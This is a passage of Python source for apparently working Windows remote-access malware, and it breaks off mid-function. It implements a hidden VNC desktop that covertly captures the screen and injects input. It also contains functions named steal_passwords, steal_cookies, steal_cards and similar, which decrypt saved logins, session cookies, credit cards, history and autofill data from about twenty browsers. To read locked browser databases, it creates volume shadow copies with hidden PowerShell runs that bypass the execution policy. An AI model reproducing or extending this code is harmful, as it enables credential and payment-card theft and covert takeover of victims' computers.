    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, _lp):
        if not u.IsWindowVisible(hwnd):
            return True
        r = _RECT()
        if not u.GetWindowRect(hwnd, ctypes.byref(r)):
            return True
        w, h = r.right - r.left, r.bottom - r.top
        if w <= 0 or h <= 0:
            return True
        n = u.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(n + 1)
        u.GetWindowTextW(hwnd, buf, n + 1)
        pid = ctypes.c_uint32()
        u.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        found.append({"hwnd": int(hwnd), "title": buf.value, "pid": pid.value,
                      "left": r.left, "top": r.top, "width": w, "height": h})
        return True

    u.EnumDesktopWindows(hdesk, cb, 0)
    return found


_GDI_READY = {"done": False}


def _gdi_prototypes():
    """Declare pointer-sized prototypes once; defaults truncate 64-bit handles."""
    if _GDI_READY["done"]:
        return
    u = ctypes.windll.user32
    g = ctypes.windll.gdi32
    u.PrintWindow.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint]
    u.PrintWindow.restype = ctypes.c_bool
    u.GetWindowDC.argtypes = [ctypes.c_void_p]
    u.GetWindowDC.restype = ctypes.c_void_p
    u.ReleaseDC.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    u.ReleaseDC.restype = ctypes.c_int
    u.EnumDesktopWindows.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]
    u.EnumDesktopWindows.restype = ctypes.c_bool
    g.CreateCompatibleDC.argtypes = [ctypes.c_void_p]
    g.CreateCompatibleDC.restype = ctypes.c_void_p
    g.CreateDIBSection.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint,
                                   ctypes.POINTER(ctypes.c_void_p), ctypes.c_void_p,
                                   ctypes.c_uint32]
    g.CreateDIBSection.restype = ctypes.c_void_p
    g.SelectObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    g.SelectObject.restype = ctypes.c_void_p
    g.DeleteObject.argtypes = [ctypes.c_void_p]
    g.DeleteObject.restype = ctypes.c_bool
    g.DeleteDC.argtypes = [ctypes.c_void_p]
    g.DeleteDC.restype = ctypes.c_bool
    g.BitBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int,
                         ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                         ctypes.c_uint32]
    g.BitBlt.restype = ctypes.c_bool
    _GDI_READY["done"] = True


def _print_window(hwnd, w, h):
    """Composite one window to an RGB image, or None with a reason."""
    from PIL import Image
    _gdi_prototypes()
    u = ctypes.windll.user32
    g = ctypes.windll.gdi32
    hwnd = ctypes.c_void_p(int(hwnd))
    hdc = g.CreateCompatibleDC(None)
    if not hdc:
        HVNC["last_error"] = "CreateCompatibleDC failed"
        return None
    try:
        bmi = _BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(_BMIH)
        bmi.bmiHeader.biWidth = w
        bmi.bmiHeader.biHeight = -h          # top-down
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32
        bmi.bmiHeader.biCompression = 0
        bits = ctypes.c_void_p()
        hbmp = g.CreateDIBSection(hdc, ctypes.byref(bmi), 0, ctypes.byref(bits), None, 0)
        if not hbmp:
            HVNC["last_error"] = "CreateDIBSection failed"
            return None
        old = g.SelectObject(hdc, hbmp)
        try:
            ok = u.PrintWindow(hwnd, hdc, 2)        # PW_RENDERFULLCONTENT
            if not ok:
                # Some layered/Chromium windows refuse PrintWindow; a straight
                # bitblt from the window DC still captures their surface.
                src = u.GetWindowDC(hwnd)
                if src:
                    try:
                        ok = g.BitBlt(hdc, 0, 0, w, h, src, 0, 0, 0x00CC0020)
                    finally:
                        u.ReleaseDC(hwnd, src)
                if not ok:
                    HVNC["last_error"] = "PrintWindow and BitBlt both failed"
                    return None
            if not bits.value:
                HVNC["last_error"] = "no pixel buffer"
                return None
            raw = ctypes.string_at(bits, w * h * 4)
            return Image.frombuffer("RGBA", (w, h), raw, "raw", "BGRA", 0, 1).convert("RGB")
        finally:
            if old:
                g.SelectObject(hdc, old)
            g.DeleteObject(hbmp)
    finally:
        g.DeleteDC(hdc)


def _hvnc_capture_loop(hdesk, name):
    """Capture the hidden desktop's own surface at a steady frame rate.

    A thread that calls SetThreadDesktop sees that desktop as its input
    desktop, so GetDC(NULL) hands back the hidden display surface. BitBlt from
    there is one copy per frame instead of one PrintWindow per window, which is
    what makes the hidden desktop usable at video rates.
    """
    u = ctypes.windll.user32
    g = ctypes.windll.gdi32
    _gdi_prototypes()
    u.SetThreadDesktop.argtypes = [ctypes.c_void_p]
    u.SetThreadDesktop.restype = ctypes.c_bool
    u.GetDC.argtypes = [ctypes.c_void_p]
    u.GetDC.restype = ctypes.c_void_p
    u.ReleaseDC.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    u.ReleaseDC.restype = ctypes.c_int

    if not u.SetThreadDesktop(ctypes.c_void_p(int(hdesk))):
        HVNC["mode"] = "composite"
        HVNC["last_error"] = "SetThreadDesktop failed (%d)" % ctypes.get_last_error()
        return

    W = int(u.GetSystemMetrics(0)) or 1280
    H = int(u.GetSystemMetrics(1)) or 720
    hdc_screen = u.GetDC(None)
    if not hdc_screen:
        HVNC["mode"] = "composite"
        HVNC["last_error"] = "GetDC failed"
        return
    mem = g.CreateCompatibleDC(hdc_screen)
    if not mem:
        u.ReleaseDC(None, hdc_screen)
        HVNC["mode"] = "composite"
        HVNC["last_error"] = "CreateCompatibleDC failed"
        return

    bmi = _BITMAPINFO()
    bmi.bmiHeader.biSize = ctypes.sizeof(_BMIH)
    bmi.bmiHeader.biWidth = W
    bmi.bmiHeader.biHeight = -H
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    bmi.bmiHeader.biCompression = 0
    bits = ctypes.c_void_p()
    hbmp = g.CreateDIBSection(mem, ctypes.byref(bmi), 0, ctypes.byref(bits), None, 0)
    if not hbmp:
        g.DeleteDC(mem)
        u.ReleaseDC(None, hdc_screen)
        HVNC["mode"] = "composite"
        HVNC["last_error"] = "CreateDIBSection failed"
        return
    old = g.SelectObject(mem, hbmp)

    HVNC["mode"] = "desktop"
    HVNC["size"] = (W, H)
    stop = HVNC["stop"]
    fails = 0
    try:
        while not stop.is_set():
            t0 = time.time()
            if not g.BitBlt(mem, 0, 0, W, H, hdc_screen, 0, 0, SRCCOPY):
                HVNC["last_error"] = "BitBlt failed (%d)" % ctypes.get_last_error()
                fails += 1
                # A session with no interactive display rejects the copy every
                # time. Hand the desktop back to the per-window compositor
                # instead of advertising a mode that can never produce a frame.
                if fails >= 3:
                    HVNC["mode"] = "composite"
                    break
                time.sleep(0.2)
                continue
            fails = 0
            raw = ctypes.string_at(bits, W * H * 4)
            blob, _, _ = _encode_jpeg(raw, W, H, int(HVNC["quality"]),
                                      float(HVNC.get("scale") or 1.0))
            with HVNC["lock"]:
                HVNC["frame"] = blob
                HVNC["seq"] += 1
                HVNC["ts"] = time.time()
            rest = (1.0 / max(1, int(HVNC["fps"]))) - (time.time() - t0)
            if rest > 0:
                stop.wait(rest)
    except Exception as e:
        HVNC["last_error"] = f"capture stopped: {e}"
    finally:
        if old:
            g.SelectObject(mem, old)
        g.DeleteObject(hbmp)
        g.DeleteDC(mem)
        u.ReleaseDC(None, hdc_screen)


def hvnc_start(_args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    if HVNC["hdesk"]:
        return {"already": True, "desktop": HVNC["name"], "mode": HVNC["mode"]}
    u = ctypes.windll.user32
    u.CreateDesktopW.restype = ctypes.c_void_p
    u.CreateDesktopW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_void_p,
                                 ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p]
    hdesk = u.CreateDesktopW(HVNC_NAME, None, None, 0, DESKTOP_ALL, None)
    if not hdesk:
        raise RuntimeError("CreateDesktop failed (%d)" % ctypes.get_last_error())
    HVNC["hdesk"] = int(hdesk)
    HVNC["name"] = HVNC_NAME
    HVNC["stop"] = threading.Event()
    HVNC["frame"] = None
    HVNC["seq"] = 0
    HVNC["ts"] = 0.0
    HVNC["last_error"] = None
    HVNC["mode"] = None

    worker = threading.Thread(target=_hvnc_capture_loop, args=(int(hdesk), HVNC_NAME),
                              daemon=True, name="hvnc-capture")
    HVNC["worker"] = worker
    worker.start()

    shell = None
    try:
        shell = hvnc_start_process({"path": "explorer.exe"})
    except Exception as e:
        HVNC["last_error"] = f"explorer did not start: {e}"

    deadline = time.time() + 2.5
    while (time.time() < deadline and HVNC["seq"] == 0
           and HVNC["mode"] not in ("composite", None)):
        time.sleep(0.05)
    if HVNC["mode"] is None:
        deadline = time.time() + 2.0
        while time.time() < deadline and HVNC["mode"] is None:
            time.sleep(0.05)
    return {"desktop": HVNC_NAME, "started": True, "mode": HVNC["mode"] or "pending",
            "shell": shell, "size": list(HVNC["size"]),
            "error": HVNC["last_error"]}


def hvnc_stop(_args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    stop = HVNC.get("stop")
    if stop:
        stop.set()
    worker = HVNC.get("worker")
    if worker and worker.is_alive():
        worker.join(timeout=2.0)
    h = HVNC.get("hdesk")
    if h:
        ctypes.windll.user32.CloseDesktop(ctypes.c_void_p(int(h)))
    HVNC.update({"hdesk": None, "name": None, "last_hwnd": None, "worker": None,
                 "stop": None, "mode": None, "frame": None, "seq": 0, "ts": 0.0})
    return {"stopped": True}


def hvnc_status(_args):
    with HVNC["lock"]:
        seq, ts = HVNC["seq"], HVNC["ts"]
    age = round(time.time() - ts, 2) if ts else None
    return {"open": bool(HVNC["hdesk"]), "desktop": HVNC["name"],
            "mode": HVNC["mode"], "fps": HVNC["fps"], "seq": seq,
            "frameAge": age, "size": list(HVNC["size"]),
            "error": HVNC["last_error"]}


def hvnc_windows(_args):
    if not HVNC["hdesk"]:
        raise RuntimeError("HVNC desktop is not open")
    wins = _desk_enum(HVNC["hdesk"])
    return {"windows": wins, "count": len(wins)}


def hvnc_processes(_args):
    if not HVNC["hdesk"]:
        raise RuntimeError("HVNC desktop is not open")
    import psutil
    seen = {}
    for w in _desk_enum(HVNC["hdesk"]):
        pid = w["pid"]
        if pid not in seen:
            try:
                p = psutil.Process(pid)
                name, rss = p.name(), p.memory_info().rss
            except Exception:
                name, rss = "?", 0
            seen[pid] = {"pid": pid, "name": name, "rss": rss, "windows": 0}
        seen[pid]["windows"] += 1
    procs = sorted(seen.values(), key=lambda x: -x["rss"])
    return {"processes": procs, "count": len(procs)}


def hvnc_start_process(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    if not HVNC["hdesk"]:
        raise RuntimeError("HVNC desktop is not open")
    path = str(args.get("path", "")).strip()
    if not path:
        raise RuntimeError("path required")
    si = _STARTUPINFO()
    si.cb = ctypes.sizeof(_STARTUPINFO)
    si.lpDesktop = HVNC["name"]
    pi = _PROCESSINFO()
    cmd = ctypes.create_unicode_buffer(path)
    okp = ctypes.windll.kernel32.CreateProcessW(
        None, cmd, None, None, False, 0x08000000, None, None,
        ctypes.byref(si), ctypes.byref(pi))
    if not okp:
        raise RuntimeError(f"CreateProcess failed ({ctypes.GetLastError()})")
    for handle in (pi.hProcess, pi.hThread):
        if handle:
            ctypes.windll.kernel32.CloseHandle(handle)
    return {"pid": pi.dwProcessId, "path": path}


def hvnc_kill_process(args):
    pid = int(args.get("pid", 0))
    if not pid:
        raise RuntimeError("pid required")
    k = ctypes.windll.kernel32
    k.OpenProcess.restype = ctypes.c_void_p
    k.OpenProcess.argtypes = [ctypes.c_uint32, ctypes.c_bool, ctypes.c_uint32]
    k.TerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
    k.CloseHandle.argtypes = [ctypes.c_void_p]
    h = k.OpenProcess(0x0001, False, pid)
    if not h:
        raise RuntimeError("cannot open process")
    try:
        if not k.TerminateProcess(h, 1):
            raise RuntimeError("TerminateProcess failed")
    finally:
        k.CloseHandle(h)
    return {"killed": pid}


def _hvnc_composite(quality):
    """Fallback: paint each top-level window of the hidden desktop in z-order."""
    from PIL import Image
    W, H = 1920, 1080
    try:
        W = ctypes.windll.user32.GetSystemMetrics(0) or W
        H = ctypes.windll.user32.GetSystemMetrics(1) or H
    except Exception:
        pass
    canvas = Image.new("RGB", (W, H), (9, 9, 14))
    wins = _desk_enum(HVNC["hdesk"])
    painted = 0
    refused = []
    HVNC["last_error"] = None
    for w in wins:
        if w["width"] > 4000 or w["height"] > 4000:
            continue
        img = _print_window(w["hwnd"], w["width"], w["height"])
        if img is None:
            refused.append({"title": w["title"], "reason": HVNC.get("last_error")})
            continue
        canvas.paste(img, (max(0, w["left"]), max(0, w["top"])))
        painted += 1
    if wins:
        HVNC["last_hwnd"] = wins[0]["hwnd"]
    s = float(HVNC.get("scale") or 1.0)
    if s < 0.999:
        W, H = max(2, int(W * s) & ~1), max(2, int(H * s) & ~1)
        canvas = canvas.resize((W, H), Image.BILINEAR)
    buf = io.BytesIO()
    canvas.save(buf, format="JPEG", quality=quality)
    with HVNC["lock"]:
        HVNC["seq"] += 1
        seq = HVNC["seq"]
    return {"jpeg": _b64(buf.getvalue()), "width": W, "height": H, "seq": seq,
            "mode": "composite", "windows": len(wins), "painted": painted,
            "refused": refused, "hwnd": HVNC["last_hwnd"] or 0}


def hvnc_frame(args):
    if not HVNC["hdesk"]:
        raise RuntimeError("HVNC desktop is not open")
    quality = max(20, min(92, int(args.get("quality", 60))))
    HVNC["quality"] = quality
    if "fps" in args:
        HVNC["fps"] = max(5, min(60, int(args["fps"])))
    if "scale" in args:
        try:
            HVNC["scale"] = max(0.25, min(1.0, float(args["scale"])))
        except (TypeError, ValueError):
            pass

    if HVNC["mode"] == "desktop":
        deadline = time.time() + 1.5
        while HVNC["seq"] == 0 and time.time() < deadline:
            time.sleep(0.03)
        with HVNC["lock"]:
            blob, seq, ts = HVNC["frame"], HVNC["seq"], HVNC["ts"]
        if not blob:
            raise RuntimeError("capture thread has not produced a frame yet")
        W, H = HVNC["size"]
        s = float(HVNC.get("scale") or 1.0)
        if s < 0.999:
            W, H = max(2, int(W * s) & ~1), max(2, int(H * s) & ~1)
        return {"jpeg": _b64(blob), "width": W, "height": H, "seq": seq,
                "mode": "desktop", "windows": 0, "painted": 0, "refused": [],
                "hwnd": HVNC["last_hwnd"] or 0, "ts": ts}
    return _hvnc_composite(quality)


def _hvnc_target(hwnd=None, x=None, y=None):
    """Resolve a window on the hidden desktop and its desktop rectangle."""
    wins = _desk_enum(HVNC["hdesk"])
    if not wins:
        return None
    if hwnd:
        for w in wins:
            if w["hwnd"] == int(hwnd):
                return w
    if x is not None and y is not None:
        for w in wins:
            if (w["left"] <= x < w["left"] + w["width"] and
                    w["top"] <= y < w["top"] + w["height"]):
                return w
    return wins[0]


def hvnc_input(args):
    if not HVNC["hdesk"]:
        raise RuntimeError("HVNC desktop is not open")
    u = ctypes.windll.user32
    _gdi_prototypes()
    u.PostMessageW.argtypes = [ctypes.c_void_p, ctypes.c_uint,
                               ctypes.c_void_p, ctypes.c_void_p]
    u.PostMessageW.restype = ctypes.c_bool
    kind = str(args.get("type", "key"))
    px = int(args["x"]) if "x" in args else None
    py = int(args["y"]) if "y" in args else None
    target = _hvnc_target(args.get("hwnd") or HVNC.get("last_hwnd"), px, py)
    if target is None:
        raise RuntimeError("no target window on the hidden desktop")
    HVNC["last_hwnd"] = target["hwnd"]
    hwnd = ctypes.c_void_p(int(target["hwnd"]))

    if kind == "text":
        for ch in str(args.get("text", "")):
            u.PostMessageW(hwnd, 0x0102, ord(ch), 0)      # WM_CHAR
        return {"sent": "text", "hwnd": target["hwnd"]}

    if kind == "mouse":
        if px is None:
            px = 0
        if py is None:
            py = 0
        # canvas coordinates are desktop coordinates: subtract the window origin
        x = px - int(target["left"])
        y = py - int(target["top"])
        action = str(args.get("action", "click"))
        lp = ((y & 0xFFFF) << 16) | (x & 0xFFFF)
        u.PostMessageW(hwnd, 0x0200, 0, lp)               # WM_MOUSEMOVE first
        if action in ("click", "left"):
            u.PostMessageW(hwnd, 0x0201, 1, lp)           # WM_LBUTTONDOWN
            u.PostMessageW(hwnd, 0x0202, 0, lp)           # WM_LBUTTONUP
        elif action == "double":
            u.PostMessageW(hwnd, 0x0201, 1, lp)
            u.PostMessageW(hwnd, 0x0202, 0, lp)
            u.PostMessageW(hwnd, 0x0203, 1, lp)           # WM_LBUTTONDBLCLK
            u.PostMessageW(hwnd, 0x0202, 0, lp)
        elif action == "right":
            u.PostMessageW(hwnd, 0x0204, 2, lp)           # WM_RBUTTONDOWN
            u.PostMessageW(hwnd, 0x0205, 0, lp)           # WM_RBUTTONUP
        elif action == "down":
            u.PostMessageW(hwnd, 0x0201, 1, lp)
        elif action == "up":
            u.PostMessageW(hwnd, 0x0202, 0, lp)
        elif action == "wheel":
            delta = int(args.get("delta", 120))
            wp = (delta & 0xFFFF) << 16
            u.PostMessageW(hwnd, 0x020A, wp, lp)          # WM_MOUSEWHEEL
        elif action == "move":
            pass
        else:
            raise RuntimeError(f"unknown mouse action: {action}")
        return {"sent": action, "hwnd": target["hwnd"], "x": x, "y": y}

    vk = int(args.get("vk", 0))
    if not vk:
        raise RuntimeError("vk required")
    u.PostMessageW(hwnd, 0x0100, vk, 0)                    # WM_KEYDOWN
    u.PostMessageW(hwnd, 0x0101, vk, 0xC0000001)           # WM_KEYUP
    return {"sent": "key", "vk": vk, "hwnd": target["hwnd"]}


def hvnc_clipboard(args):
    if "text" in args:
        clipboard_set({"text": str(args["text"])})
        return {"set": True}
    return {"text": clipboard_get({}).get("text", "")}


# --------------------------------------------------------------------------
# credential / data recovery
# --------------------------------------------------------------------------
def _browser_roots():
    la = os.environ.get("LOCALAPPDATA", "")
    ad = os.environ.get("APPDATA", "")
    roots = {
        "chrome": Path(la) / "Google" / "Chrome" / "User Data",
        "chrome-beta": Path(la) / "Google" / "Chrome Beta" / "User Data",
        "chrome-dev": Path(la) / "Google" / "Chrome Dev" / "User Data",
        "chrome-sxs": Path(la) / "Google" / "Chrome SxS" / "User Data",
        "edge": Path(la) / "Microsoft" / "Edge" / "User Data",
        "edge-beta": Path(la) / "Microsoft" / "Edge Beta" / "User Data",
        "edge-dev": Path(la) / "Microsoft" / "Edge Dev" / "User Data",
        "brave": Path(la) / "BraveSoftware" / "Brave-Browser" / "User Data",
        "brave-beta": Path(la) / "BraveSoftware" / "Brave-Browser-Beta" / "User Data",
        "vivaldi": Path(la) / "Vivaldi" / "User Data",
        "opera": Path(ad) / "Opera Software" / "Opera Stable",
        "opera-gx": Path(ad) / "Opera Software" / "Opera GX Stable",
        "opera-beta": Path(ad) / "Opera Software" / "Opera Next",
        "chromium": Path(la) / "Chromium" / "User Data",
        "yandex": Path(la) / "Yandex" / "YandexBrowser" / "User Data",
        "thorium": Path(la) / "Thorium" / "User Data",
        "avast": Path(la) / "AVAST Software" / "Browser" / "User Data",
        "ccleaner": Path(la) / "CCleaner" / "Browser" / "User Data",
        "sidekick": Path(la) / "Sidekick" / "User Data",
        "arc": Path(la) / "Packages" / "TheBrowserCompany.Arc" / "LocalCache" / "Local" / "Arc" / "User Data",
    }
    return {k: v for k, v in roots.items() if v.exists()}


def _profiles(root):
    """Chrome-family roots hold Default plus Profile N.

    Opera and friends point straight at one profile directory. The old code
    treated the User Data root itself as a profile, so it looked for
    User Data/Network/Cookies and found nothing on every Chromium browser.
    """
    out = []
    if (root / "Default").is_dir():
        out.append(root / "Default")
    out.extend(sorted(p for p in root.glob("Profile *") if p.is_dir()))
    if not out:
        return [root]
    return out


def _ro_connect(db):
    uri = f"file:{db.as_posix()}?mode=ro&immutable=1"
    return sqlite3.connect(uri, uri=True, timeout=2)


# A running Chromium browser opens its cookie database with no sharing at all,
# so even a plain read gets ERROR_SHARING_VIOLATION (32). No share flag, no
# privilege and no backup intent gets past that; only a shadow copy does.
VSS = {"root": None, "id": None, "tmp": None, "copies": {}, "tried": False}


def _vss_mount():
    """Mount a client-accessible shadow copy of the system volume."""
    if VSS["root"] and Path(VSS["root"]).is_dir():
        return VSS["root"]
    if not IS_WIN or VSS["tried"]:
        return VSS["root"]
    VSS["tried"] = True

    script = (
        "$ErrorActionPreference='Stop';"
        "$c=[WMICLASS]'root\\cimv2:Win32_ShadowCopy';"
        "$r=$c.Create('C:\\\\','ClientAccessible');"
        "if($r.ReturnValue -ne 0){exit 3};"
        "Write-Output $r.ShadowID;"
        "$s=Get-CimInstance Win32_ShadowCopy|Where-Object{$_.ID -eq $r.ShadowID};"
        "Write-Output $s.DeviceObject"
    )
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
            capture_output=True, text=True, timeout=90,
            creationflags=0x08000000)
        lines = [l.strip() for l in (out.stdout or "").splitlines() if l.strip()]
        if out.returncode != 0 or len(lines) < 2:
            return None
        shadow_id, device = lines[0], lines[1]
    except (OSError, subprocess.SubprocessError):
        return None

    try:
        tmp = Path(tempfile.mkdtemp(prefix=".snap-"))
        link = tmp / "v"
        made = subprocess.run(["cmd", "/c", "mklink", "/d", str(link), device + "\\"],
                              capture_output=True, text=True, timeout=30,
                              creationflags=0x08000000)
        if made.returncode != 0 or not link.is_dir():
            shutil.rmtree(tmp, ignore_errors=True)
            return None
    except (OSError, subprocess.SubprocessError):
        return None

    VSS.update(root=str(link), id=shadow_id, tmp=str(tmp))
    return VSS["root"]


def _vss_release():
    """Drop the shadow and its mount. Called when a steal run finishes."""
    if VSS["root"]:
        try:
            subprocess.run(["cmd", "/c", "rmdir", VSS["root"]],
                           capture_output=True, timeout=20,
                           creationflags=0x08000000)
        except (OSError, subprocess.SubprocessError):
            pass
    if VSS["id"]:
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
                 "Get-CimInstance Win32_ShadowCopy|Where-Object{$_.ID -eq '%s'}|"
                 "Remove-CimInstance" % VSS["id"]],
                capture_output=True, timeout=60, creationflags=0x08000000)
        except (OSError, subprocess.SubprocessError):
            pass
    if VSS["tmp"]:
        shutil.rmtree(VSS["tmp"], ignore_errors=True)
    VSS.update(root=None, id=None, tmp=None, copies={}, tried=False)


def _shadow_copy(db):
    """Copy one locked SQLite file out of the shadow mount into a temp dir."""
    key = str(db)
    if key in VSS["copies"]:
        cached = VSS["copies"][key]
        return Path(cached) if cached and Path(cached).exists() else None

    root = _vss_mount()
    if not root:
        VSS["copies"][key] = None
        return None

    drive = str(db)[:1]
    rel = str(db)[3:] if len(str(db)) > 2 else str(db)
    source = Path(root) / rel
    if not source.exists():                       # volume is not always C:
        source = Path(root) / f"{drive}{rel}"
        if not source.exists():
            VSS["copies"][key] = None
            return None

    dest = Path(tempfile.mkdtemp(prefix="db-")) / db.name
    try:
        shutil.copy2(source, dest)
    except OSError:
        shutil.rmtree(dest.parent, ignore_errors=True)
        VSS["copies"][key] = None
        return None
    for side in ("-wal", "-shm", "-journal"):
        extra = Path(str(source) + side)
        if extra.exists():
            try:
                shutil.copy2(extra, Path(str(dest) + side))
            except OSError:
                pass
    VSS["copies"][key] = str(dest)
    return dest


def _open_db(db):
    """Open a browser database, falling back to a shadow copy when locked."""
    try:
        return _ro_connect(db)
    except Exception:
        snap = _shadow_copy(db)
        if snap is None:
            raise
        return _ro_connect(snap)


def _chrome_key(root):
    ls = root / "Local State"
    if not ls.exists():
        return None
    try:
        data = json.loads(ls.read_text(encoding="utf-8"))
        enc = base64.b64decode(data["os_crypt"]["encrypted_key"])
        if enc.startswith(b"DPAPI"):
            enc = enc[5:]
        return _dpapi(enc) or None
    except Exception:
        return None


def _decrypt_blob(blob, key):
    """Chromium value decryptor.

    v10/v11 are AES-256-GCM with the Local State key. v20 is app-bound
    encryption (Chrome 127+): the key is sealed by the browser's elevation
    service and cannot be unwrapped from user mode, so we mark it instead of
    handing back an empty string that looks like a failed steal.
    """
    if not blob:
        return ""
    if blob[:3] == b"v20":
        return "<app-bound:v20>"
    try:
        if blob[:3] in (b"v10", b"v11") and key:
            from Crypto.Cipher import AES
            nonce, ct, tag = blob[3:15], blob[15:-16], blob[-16:]
            return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag).decode("utf-8", "replace")
        plain = _dpapi(blob)
        return plain.decode("utf-8", "replace") if plain else ""
    except Exception:
        return "<undecryptable>"


STEAL_NOTES = []


def _note(msg):
    """Collect per-collector failures so an empty result is never ambiguous."""
    if msg not in STEAL_NOTES:
        STEAL_NOTES.append(msg)


def _cookie_rows(limit=400):
    rows = []
    sealed = {}
    for name, root in _browser_roots().items():
        key = _chrome_key(root)
        for prof in _profiles(root):
            db = prof / "Network" / "Cookies"
            if not db.exists():
                db = prof / "Cookies"
            if not db.exists():
                continue
            try:
                con = _open_db(db)
                try:
                    cur = con.execute(
                        "SELECT host_key, name, path, expires_utc, encrypted_value FROM cookies LIMIT ?",
                        (limit,))
                    for host, cname, cpath, exp, enc in cur:
                        val = _decrypt_blob(enc, key)
                        if val:
                            if val == "<app-bound:v20>":
                                sealed[name] = sealed.get(name, 0) + 1
                            rows.append({"browser": name, "profile": prof.name,
                                         "host": host, "name": cname, "path": cpath,
                                         "expires": _chrome_time(exp), "value": val[:4000]})
                finally:
                    con.close()
            except Exception as e:
                _note(f"cookies/{name}/{prof.name}: {type(e).__name__}: {e}")
                continue
    for name, n in sealed.items():
        _note(f"{name}: {n} cookies are app-bound (v20) — the value is sealed by the "
              f"browser's elevation service, only host/name/expiry are readable")
    return rows[:limit]


def steal_cookies(_args):
    STEAL_NOTES.clear()
    rows = _cookie_rows()
    return {"cookies": rows, "count": len(rows), "notes": list(STEAL_NOTES)}


def steal_history(_args):
    STEAL_NOTES.clear()
    rows = []
    for name, root in _browser_roots().items():
        for prof in _profiles(root):
            db = prof / "History"
            if not db.exists():
                continue
            try:
                con = _open_db(db)
                try:
                    cur = con.execute(
                        "SELECT url, title, visit_count, last_visit_time FROM urls "
                        "ORDER BY last_visit_time DESC LIMIT 300")
                    for url, title, visits, last in cur:
                        rows.append({"browser": name, "url": url, "title": title,
                                     "visits": visits, "last": _chrome_time(last)})
                finally:
                    con.close()
            except Exception as e:
                _note(f"history/{name}/{prof.name}: {type(e).__name__}: {e}")
                continue
    rows.sort(key=lambda r: r["last"] or "", reverse=True)
    return {"history": rows[:500], "count": len(rows), "notes": list(STEAL_NOTES)}


def steal_autofill(_args):
    rows = []
    for name, root in _browser_roots().items():
        for prof in _profiles(root):
            db = prof / "Web Data"
            if not db.exists():
                continue
            try:
                con = _open_db(db)
                try:
                    cur = con.execute("SELECT name, value, count FROM autofill LIMIT 500")
                    for field, value, count in cur:
                        rows.append({"browser": name, "field": field,
                                     "value": value, "count": count})
                finally:
                    con.close()
            except Exception as e:
                _note(f"autofill/{name}/{prof.name}: {type(e).__name__}: {e}")
                continue
    return {"entries": rows[:500], "count": len(rows), "notes": list(STEAL_NOTES)}


def steal_passwords(_args):
    STEAL_NOTES.clear()
    rows = []
    for name, root in _browser_roots().items():
        key = _chrome_key(root)
        if not key:
            _note(f"{name}: master key unavailable (Local State DPAPI)")
        for prof in _profiles(root):
            db = prof / "Login Data"
            if not db.exists():
                continue
            try:
                con = _open_db(db)
                try:
                    cur = con.execute(
                        "SELECT origin_url, username_value, password_value FROM logins LIMIT 500")
                    for url, user, enc in cur:
                        pwd = _decrypt_blob(enc, key)
                        if user or pwd:
                            rows.append({"browser": name, "url": url,
                                         "username": user, "password": pwd})
                finally:
                    con.close()
            except Exception as e:
                _note(f"passwords/{name}/{prof.name}: {type(e).__name__}: {e}")
                continue
    return {"accounts": rows[:500], "count": len(rows), "notes": list(STEAL_NOTES)}


def _web_data_rows(profile, sql, limit=500):
    """Shared reader for the Web Data / History databases."""
    out = []
    db = profile / "Web Data"
    if not db.exists():
        return out
    try:
        con = _open_db(db)
        try:
            for row in con.execute(sql).fetchmany(limit):
                out.append(row)
        finally:
            con.close()
    except Exception:
        pass
    return out


def steal_cards(_args):
    rows = []
    for name, root in _browser_roots().items():
        key = _chrome_key(root)
        for prof in _profiles(root):
            for num, exp_m, exp_y, card, holder in _web_data_rows(
                    prof,
                    "SELECT card_number_encrypted, expiration_month, expiration_year, "
                    "name_on_card, nickname FROM credit_cards"):
                rows.append({"browser": name, "profile": prof.name,
                             "number": _decrypt_blob(num, key),
                             "exp": f"{exp_m:02d}/{exp_y}" if exp_m else "",
                             "name": holder or "", "label": card or ""})
    return {"cards": rows, "count": len(rows)}


def steal_downloads(_args):
    rows = []
    for name, root in _browser_roots().items():
        for prof in _profiles(root):
            db = prof / "History"
            if not db.exists():
                continue
            try:
                con = _open_db(db)
                try:
                    cur = con.execute(
                        "SELECT target_path, tab_url, total_bytes, start_time FROM downloads "
                        "ORDER BY start_time DESC LIMIT 200")
                    for path, url, size, when in cur:
                        rows.append({"browser": name, "path": path, "url": url,
                                     "bytes": size, "when": _chrome_time(when)})
                finally:
                    con.close()
            except Exception:
                continue
    return {"downloads": rows[:400], "count": len(rows)}


def steal_bookmarks(_args):
    out = []
    for name, root in _browser_roots().items():
        for prof in _profiles(root):
            bm = prof / "Bookmarks"
            if not bm.exists():
                continue
            try:
                data = json.loads(bm.read_text(encoding="utf-8", errors="replace"))
            except Exception:
                continue

            def walk(node, folder=""):
                if isinstance(node, dict):
                    if node.get("type") == "url":
                        out.append({"browser": name, "folder": folder,
                                    "name": node.get("name", ""),
                                    "url": node.get("url", "")})
                    for child in node.get("children") or []:
                        walk(child, node.get("name") or folder)
                elif isinstance(node, list):
                    for child in node:
                        walk(child, folder)

            for key in ("bookmark_bar", "other", "synced"):
